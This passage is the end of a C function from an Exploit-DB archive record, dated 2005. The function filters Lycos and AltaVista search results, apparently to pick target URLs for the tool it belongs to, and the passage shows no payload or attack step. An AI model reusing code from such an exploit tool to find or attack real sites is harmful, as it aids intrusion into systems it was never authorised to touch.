&&!strstr(test_bf,\"/search/\")&&!strstr(test_bf,\"%3F\")\r\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\r\n   {\r\n    return 1;\r\n   }\r\n   else return 0;\r\n   break;\r\n   \r\n  case 3: /* lycos */\r\n   if(!strstr(test_bf,\"lycos\")&&!strstr(test_bf,\"<\")\r\n    &&!strstr(test_bf,\">\")&&!strstr(test_bf,\"%3F\")\r\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\r\n   {\r\n    return 1;\r\n   }\r\n   else return 0;\r\n   break;\r\n   \r\n  case 4: /* altavista */\r\n   if(!strstr(test_bf,\"ref_\")&&!strstr(test_bf,\"<\")\r\n    &&!strstr(test_bf,\">\")&&!strstr(test_bf,\"%3f\")\r\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\r\n   {\r\n    return 1;\r\n   }\r\n   else return 0;\r\n   break;\r\n   \r\n  default:\r\n   return 0;\r\n   break;\r\n }\r\n return 0;\r\n}\r\n\r\n// milw0rm.com [2005-05-06]",
  "url": "https://www.exploit-db.com/exploits/982"
}